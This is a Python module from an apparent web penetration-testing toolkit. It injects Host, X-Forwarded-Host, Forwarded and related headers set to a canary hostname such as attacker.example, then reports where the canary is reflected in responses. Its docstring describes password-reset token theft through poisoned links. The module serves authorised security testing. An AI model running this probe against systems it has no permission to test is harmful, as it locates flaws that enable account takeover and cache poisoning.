#!/usr/bin/env python3
"""
redshift_toolkit.web.host_header_attacks — Host / X-Forwarded-Host injection probe.

Why this matters
----------------
Many frameworks build absolute URLs (password reset, email confirmation, OAuth
callbacks) by trusting either the Host header or the X-Forwarded-* family
without validation. A reset email of the form

    https://attacker.com/reset?token=ey....

allows the attacker to harvest the token when the victim clicks. Cache poisoning,
SSRF, and bypassing access controls on routing layers also commonly stem from
host-header confusion.

What this script tests
----------------------
For a given target URL, send the request with the original Host plus the
following injected headers (one at a time) set to an attacker-controlled value:

    Host:                          attacker.example
    X-Forwarded-Host
    X-Host
    X-Forwarded-Server
    X-HTTP-Host-Override
    Forwarded                      (RFC 7239: host=attacker.example)

For each variant, look for the canary value reflected in:

    * Response body                (template / link injection)
    * Location header              (redirect to attacker)
    * Set-Cookie domain
    * Any header value

A reflected canary is a high-confidence finding when combined with a sensitive
endpoint (password reset, email confirmation, account verification).

Usage
-----
    python3 -m redshift_toolkit.web.host_header_attacks \\
        --url https://target.example/reset \\
        --canary attacker.example \\
        --method POST \\
        --body "email=victim@target.example"

Author: Redshift Project — Module 16 (Advanced Web Attacks)
License: MIT — authorised testing only.
"""
from __future__ import annotations

import argparse
import json
import sys
from dataclasses import asdict, dataclass, field
from typing import List, Optional
from urllib.parse import urlparse

from .http_client import HttpRequest, send


# ---------------------------------------------------------------------------
# ANSI helpers
# ---------------------------------------------------------------------------
GREEN, RED, YELLOW, CYAN, GREY, BOLD, RESET = (
    "\x1b[32m", "\x1b[31m", "\x1b[33m", "\x1b[36m", "\x1b[90m", "\x1b[1m", "\x1b[0m",
)


def paint(text: str, colour: str, *, enabled: bool = True) -> str:
    return f"{colour}{text}{RESET}" if enabled else text


# ---------------------------------------------------------------------------
# Header variants
# ---------------------------------------------------------------------------
INJECTION_HEADERS = [
    # (label, headers_to_apply)
    ("Host override",            [("Host",                   "{canary}")]),
    ("X-Forwarded-Host",         [("X-Forwarded-Host",       "{canary}")]),
    ("X-Forwarded-Host + Host",  [("Host", "{orig}"), ("X-Forwarded-Host", "{canary}")]),
    ("X-Host",                   [("X-Host",                 "{canary}")]),
    ("X-Forwarded-Server",       [("X-Forwarded-Server",     "{canary}")]),
    ("X-HTTP-Host-Override",     [("X-HTTP-Host-Override",   "{canary}")]),
    ("Forwarded (RFC 7239)",     [("Forwarded",              "host={canary}")]),
    ("Double Host",              [("Host",                   "{orig}"), ("Host", "{canary}")]),
    ("Host w/ port",             [("Host",                   "{canary}:80")]),
    ("Host comma-injected",      [("Host",                   "{orig}, {canary}")]),
]


# ---------------------------------------------------------------------------
# Finding model
# ---------------------------------------------------------------------------
@dataclass
class Finding:
    label: str
    headers_sent: List[List[str]]
    status: int
    canary_in_body: bool = False
    canary_in_location: bool = False
    canary_in_setcookie: bool = False
    canary_in_other_header: Optional[str] = None
    snippet: str = ""

    @property
    def hit(self) -> bool:
        return any([
            self.canary_in_body,
            self.canary_in_location,
            self.canary_in_setcookie,
            self.canary_in_other_header is not None,
        ])

    def severity(self) -> str:
        if self.canary_in_location or self.canary_in_setcookie:
            return "HIGH"
        if self.canary_in_body:
            return "MEDIUM"
        if self.canary_in_other_header:
            return "LOW"
        return "INFO"


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------
def probe(url: str, canary: str, *, method: str = "GET",
          body: Optional[str] = None, timeout: float = 10.0,
          extra_headers: Optional[List[tuple]] = None) -> List[Finding]:
    parsed = urlparse(url)
    orig_host = parsed.netloc

    findings: List[Finding] = []
    for label, header_specs in INJECTION_HEADERS:
        # Build headers
        hs: List[tuple] = list(extra_headers or [])
        applied: List[List[str]] = []
        for k, v in header_specs:
            v = v.format(canary=canary, orig=orig_host)
            hs.append((k, v))
            applied.append([k, v])

        # Default Host if not overridden
        if not any(k.lower() == "host" for k, _ in hs):
            hs.append(("Host", orig_host))

        try:
            req = HttpRequest(method=method, url=url, headers=hs,
                              body=body.encode() if body else None)
            resp = send(req, timeout=timeout, follow_redirects=False)
        except Exception as e:
            findings.append(Finding(label=label, headers_sent=applied,
                                    status=-1, snippet=f"<error: {e}>"))
            continue

        # Reflection checks
        body_text = ""
        try:
            body_text = (resp.body or b"").decode("utf-8", errors="replace")
        except Exception:
            body_text = ""

        in_body = canary.lower() in body_text.lower()
        loc = resp.get_header("location") or ""
        in_loc = canary.lower() in loc.lower()
        sc = resp.get_header("set-cookie") or ""
        in_sc = canary.lower() in sc.lower()

        in_other: Optional[str] = None
        for k, v in resp.headers:
            if k.lower() in ("location", "set-cookie"):
                continue
            if canary.lower() in v.lower():
                in_other = f"{k}: {v[:120]}"
                break

        snip = ""
        if in_body:
            idx = body_text.lower().find(canary.lower())
            snip = body_text[max(0, idx - 40):idx + len(canary) + 40]
            snip = snip.replace("\n", "\\n")

        findings.append(Finding(
            label=label, headers_sent=applied, status=resp.status,
            canary_in_body=in_body, canary_in_location=in_loc,
            canary_in_setcookie=in_sc, canary_in_other_header=in_other,
            snippet=snip,
        ))
    return findings


# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------
def report_text(findings: List[Finding], colour: bool = True) -> str:
    lines: List[str] = []
    lines.append(paint(f"\n[redshift] host-header probe — {len(findings)} variants", BOLD, enabled=colour))
    for f in findings:
        sev = f.severity()
        sev_colour = {"HIGH": RED, "MEDIUM": YELLOW, "LOW": CYAN}.get(sev, GREY)
        lines.append(f"  {paint(f.label, BOLD, enabled=colour):40s}  "
                     f"status={f.status}  {paint(sev, sev_colour, enabled=colour)}")
        if f.canary_in_location:
            lines.append(f"      → reflected in Location header (HIGH)")
        if f.canary_in_setcookie:
            lines.append(f"      → reflected in Set-Cookie domain")
        if f.canary_in_body and f.snippet:
            lines.append(f"      → reflected in body: ...{f.snippet}...")
        if f.canary_in_other_header:
            lines.append(f"      → reflected in {f.canary_in_other_header}")
    hits = [f for f in findings if f.hit]
    lines.append("")
    if hits:
        lines.append(paint(f"[!] {len(hits)} reflection(s) detected — investigate password reset / email flows.",
                           RED, enabled=colour))
    else:
        lines.append(paint("[ok] no host-header reflections detected.", GREEN, enabled=colour))
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main(argv: Optional[List[str]] = None) -> int:
    p = argparse.ArgumentParser(
        prog="host_header_attacks",
        description="Host / X-Forwarded-Host injection probe.",
    )
    p.add_argument("--url", required=True)
    p.add_argument("--canary", default="redshift-canary.example",
                   help="hostname to inject (default: %(default)s)")
    p.add_argument("--method", default="GET")
    p.add_argument("--body", default=None)
    p.add_argument("--header", action="append", default=[],
                   help="extra request headers, format Key:Value (repeatable)")
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--format", choices=["text", "json"], default="text")
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args(argv)

    extra: List[tuple] = []
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra.append((k.strip(), v.strip()))

    findings = probe(args.url, args.canary, method=args.method, body=args.body,
                     timeout=args.timeout, extra_headers=extra)

    if args.format == "json":
        print(json.dumps([asdict(f) for f in findings], indent=2))
    else:
        print(report_text(findings, colour=not args.no_color))

    return 0 if any(f.hit for f in findings) else 1


if __name__ == "__main__":
    sys.exit(main())
